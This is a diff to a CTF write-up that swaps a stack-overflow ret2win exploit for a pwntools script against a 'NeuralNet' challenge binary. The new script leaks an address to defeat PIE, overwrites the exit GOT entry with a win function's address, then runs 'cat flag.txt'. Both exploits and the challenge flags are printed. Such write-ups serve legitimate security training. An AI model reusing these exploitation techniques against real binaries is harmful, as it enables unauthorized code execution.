@@ -109,11 +109,11 @@ Once both `first` and `second` are set, the `win()` function will print the flag
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template StackSmasher --host ctf.mf.grsu.by --port 9078
+# $ pwn template NeuralNet --host ctf.mf.grsu.by --port 9076
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or 'StackSmasher')
+exe = context.binary = ELF(args.EXE or 'NeuralNet')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -121,16 +121,29 @@ exe = context.binary = ELF(args.EXE or 'StackSmasher')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or 'ctf.mf.grsu.by'
-port = int(args.PORT or 9078)
+port = int(args.PORT or 9076)
 
-env_vars = {'FLAG_VAL': 'grodno{dummy_flag}'}
+# Use the specified remote libc version unless explicitly told to use the
+# local system version with the `LOCAL_LIBC` argument.
+# ./exploit.py LOCAL LOCAL_LIBC
+if args.LOCAL_LIBC:
+    libc = exe.libc
+elif args.LOCAL:
+    library_path = libcdb.download_libraries('libc.so.6')
+    if library_path:
+        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
+        libc = exe.libc
+    else:
+        libc = ELF('libc.so.6')
+else:
+    libc = ELF('libc.so.6')
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
-        return process([exe.path] + argv, env= env_vars, *a, **kw)
+        return process([exe.path] + argv, *a, **kw)
 
 def start_remote(argv=[], *a, **kw):
     '''Connect to the process on the remote host'''
@@ -161,7 +174,8 @@ continue
 # RELRO:      Partial RELRO
 # Stack:      No canary found
 # NX:         NX enabled
-# PIE:        No PIE (0x400000)
+# PIE:        PIE enabled
+# RUNPATH:    b'./'
 # Stripped:   No
 
 io = start()
@@ -175,18 +189,21 @@ io = start()
 # flag = io.recv(...)
 # log.success(flag)
 
-offset = 40
-payload = flat (
-        b'A' * 40,
-        exe.symbols['step1'],
-        exe.symbols['step2'],
-        exe.symbols['win']
-)
-io.sendline(payload)
-io.recvuntil(b'@')
-flag = io.recvline().strip(b'"\n')
-log.success(f"FLAG : {flag.decode()}")
+io.recvuntil(b'Prediction module address (predict_outcome): ')
+exe.address = int(io.recvline().strip(),16) - exe.symbols['predict_outcome']
+log.success(f"exe.address : {hex(exe.address)}")
 
+exit_got = exe.got['exit']
+ret2win = exe.symbols['unlock_secret_research_data']
+io.sendline(b'3')
+io.sendline(hex(exit_got).encode())
+io.sendline(hex(ret2win).encode())
+io.sendline(b'4')
+io.sendline(b'cat flag.txt')
+io.recvuntil(b"You've gained root access to the main dataset server.")
+io.recvline()
+flag = io.recvline().strip()
+log.success(f"FLAG : {flag.decode()}")
 
 ```
 
@@ -194,7 +211,7 @@ log.success(f"FLAG : {flag.decode()}")
 
 ## Exploit Output
 
-![Alt text](img/6.png)
+![Alt text](img/8.png)
 
 ---
 
@@ -209,5 +226,5 @@ log.success(f"FLAG : {flag.decode()}")
 ## Flag
 
 ```
-grodno{unCL3_M47V3y_w45_h3R3_w17H_0ld_5Ch00L_3xPL017}
+grodno{p3R3D08UchIL_n3ir053t_prY4M0_v_G0T}
 ```
